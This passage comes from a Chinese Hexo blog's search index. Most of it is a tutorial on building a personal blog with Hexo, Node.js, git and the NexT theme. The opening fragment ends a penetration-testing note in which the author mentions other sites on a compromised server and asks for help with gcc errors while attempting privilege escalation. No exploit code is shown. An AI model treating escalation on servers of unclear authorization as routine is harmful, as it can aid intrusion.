src="https://xzfile.aliyuncs.com/media/upload/picture/20210326145101-a09d4bc4-8dff-1.png"></p><p>这个服务器上，还有很多很多站点，我没发现，我去，</p><p>最后提权，提权时遇到个问题，gcc编译时报错，这是什么原因啊？有那位大佬带带我啊。<br>不管编译啥文件，都是报这个错误<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326145110-a63acbc4-8dff-1.png"></p>]]></content>
    
    
    <categories>
      
      <category>技术分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客搭建一</title>
    <link href="/2020/12/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/"/>
    <url>/2020/12/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/1.png" alt="扫码"></p><h1 id="使用Hexo-Next搭建个人博客"><a href="#使用Hexo-Next搭建个人博客" class="headerlink" title="使用Hexo+Next搭建个人博客"></a>使用Hexo+Next搭建个人博客</h1><h3 id="应为我的腾讯云服务器到期了，域名还有半年时间到期，我就想着能不能用这个域名搭个bolg"><a href="#应为我的腾讯云服务器到期了，域名还有半年时间到期，我就想着能不能用这个域名搭个bolg" class="headerlink" title="应为我的腾讯云服务器到期了，域名还有半年时间到期，我就想着能不能用这个域名搭个bolg"></a>应为我的腾讯云服务器到期了，域名还有半年时间到期，我就想着能不能用这个域名搭个bolg</h3><h4 id="首先想到的是GitHub-pages，到网上搜索了半天，终于找到了合适的"><a href="#首先想到的是GitHub-pages，到网上搜索了半天，终于找到了合适的" class="headerlink" title="首先想到的是GitHub pages，到网上搜索了半天，终于找到了合适的"></a>首先想到的是GitHub pages，到网上搜索了半天，终于找到了合适的</h4><span id="more"></span><h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><h2 id="本机需要安装，nodejs环境和git，hexo"><a href="#本机需要安装，nodejs环境和git，hexo" class="headerlink" title="本机需要安装，nodejs环境和git，hexo"></a>本机需要安装，nodejs环境和git，hexo</h2><h3 id="nodejs安装"><a href="#nodejs安装" class="headerlink" title="nodejs安装"></a>nodejs安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Windows<br>官网下载安装程序<br>https://nodejs.org/en/download/<br>一键安装<br>一直下一步，有手就行就不多说了 <br>安装完成后输入,检查是否安装成功<br>node -v<br>npm -v<br>设置npm下载源<br>设置华为源：<br>npm config <span class="hljs-built_in">set</span> registry https://mirrors.huaweicloud.com/repository/npm/<br>查看npm的设置<br>npm config list<br>用新源更新一波package：<br>npm update<br><br></code></pre></td></tr></table></figure><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229083859445.png" alt="image-20201229083859445"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229090049579.png" alt="image-20201229090049579"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229090743486.png" alt="image-20201229090743486"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229090825207.png" alt="image-20201229090825207"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229091424914.png" alt="image-20201229091424914"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">linux<br>我这是用的unubtu<br>apt安装安装完成后和上面一样设置下载源<br>sudo apt-get install nodejs<br>sudo apt-get install npm<br></code></pre></td></tr></table></figure><h3 id="git安装"><a href="#git安装" class="headerlink" title="git安装"></a>git安装</h3><h4 id="Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。"><a href="#Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。" class="headerlink" title="Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。"></a>Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Windows<br>官网下载安装程序<br>https://git-scm.com/downloads/<br>一键安装<br>一直下一步，有手就行就不多说了 <br>安装完成后桌面右键，查看是否有Git Bash,来检查是否安装成功<br>打开Git Bash设置GitHub账号<br><br><br><br></code></pre></td></tr></table></figure><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229092144720.png" alt="image-20201229092144720"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229091931644.png" alt="image-20201229091931644"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229092226145.png" alt="image-20201229092226145"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229092501758.png" alt="image-20201229092501758"></p><h3 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h3><h4 id="前面git和nodejs安装好后，就可以安装hexo了，你可以先创建一个文件夹blog，然后cd到这个文件夹下（或者在这个文件夹下直接右键git-bash打开）。"><a href="#前面git和nodejs安装好后，就可以安装hexo了，你可以先创建一个文件夹blog，然后cd到这个文件夹下（或者在这个文件夹下直接右键git-bash打开）。" class="headerlink" title="前面git和nodejs安装好后，就可以安装hexo了，你可以先创建一个文件夹blog，然后cd到这个文件夹下（或者在这个文件夹下直接右键git bash打开）。"></a>前面git和nodejs安装好后，就可以安装hexo了，你可以先创建一个文件夹blog，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接右键git bash打开）。</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">window<br>直接在powershell输入，安装<br>npm install -g hexo-cli<br>查看下hexo版本，来判断是否安装成功<br>hexo -v<br>用hexo初始化一个项目<br>hexo init myblog<br>然后进入，项目文件夹安装环境依赖<br><span class="hljs-built_in">cd</span> myblog<br>npm install<br>部署个博客<br>hexo g<br>hexo server<br>在浏览器输入localhost:4000就可以看到你生成的博客了。<br>ctrl+c，即可退出程序<br></code></pre></td></tr></table></figure><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229102955683.png" alt="image-20201229102955683"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229103048490.png" alt="image-20201229103048490"></p><h4 id="hexo安装完成后，安装next主题"><a href="#hexo安装完成后，安装next主题" class="headerlink" title="hexo安装完成后，安装next主题"></a>hexo安装完成后，安装next主题</h4><h4 id="因为hexo默认的主题，emmm，我看着不太喜欢，所以我们要换个主题"><a href="#因为hexo默认的主题，emmm，我看着不太喜欢，所以我们要换个主题" class="headerlink" title="因为hexo默认的主题，emmm，我看着不太喜欢，所以我们要换个主题"></a>因为hexo默认的主题，emmm，我看着不太喜欢，所以我们要换个主题</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">到你的hexo项目文件夹中执行以下命令，我推荐用第一个，应为快<br><span class="hljs-built_in">cd</span> ~/myblog<br>npm install hexo-theme-next <br>或者<br><span class="hljs-built_in">cd</span> ~/myblog<br>git <span class="hljs-built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next<br>下载完后配置下，博客根目录下的_config.yml，打开，找到theme设置为next<br>theme: next<br>设置完成后重新部署启动<br>hexo g<br>hexo s<br>在浏览器输入localhost:4000就可以看到你生成的博客，主题换了<br></code></pre></td></tr></table></figure><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229103415297.png" alt="image-20201229103415297"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229103624110.png" alt="image-20201229103624110"></p><p><img src="/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/image-20201229105055980.png" alt="image-20201229105055980"></p>]]></content>
    
    
    <categories>
      
      <category>技术分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客搭建</tag>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
